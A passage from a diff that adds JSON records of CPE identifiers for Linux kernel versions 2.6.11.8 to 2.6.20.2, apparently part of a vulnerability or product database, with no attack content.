+          "Version": "2.6.11.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.12.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.12.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.13.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.13.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.14.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.14.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.15.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.15.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.18:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.19:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.19"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.21:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.21"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.22:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.22"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.23:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.23"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.24:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.25:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.25"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.26:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.26"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.27:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.28:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.29:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.29"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.30:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.30"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:-rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:-rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:-rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:-rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.31:-rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.31"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.32:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.32"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.33:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.34:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.34"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.35:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.35"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.36:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.36"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.37:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.37"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.38:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.38"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.39:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.39"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.40:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.40"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.41:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.41"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.42:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.42"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.43:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.43"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.44:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.44"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.45:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.45"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.46:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.46"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.47:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.47"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.48:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.48"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.49:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.49"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.50:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.50"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.51:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.51"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.52:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.52"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.53:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.53"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.54:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.54"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.55:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.55"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.56:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.56"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.57:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.57"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.58:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.58"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.59:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.59"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.60:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.60"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.61:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.61"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.16.62:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.16.62"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.17.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.17.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.18.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.18.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.19.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.19.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.2"
+        },
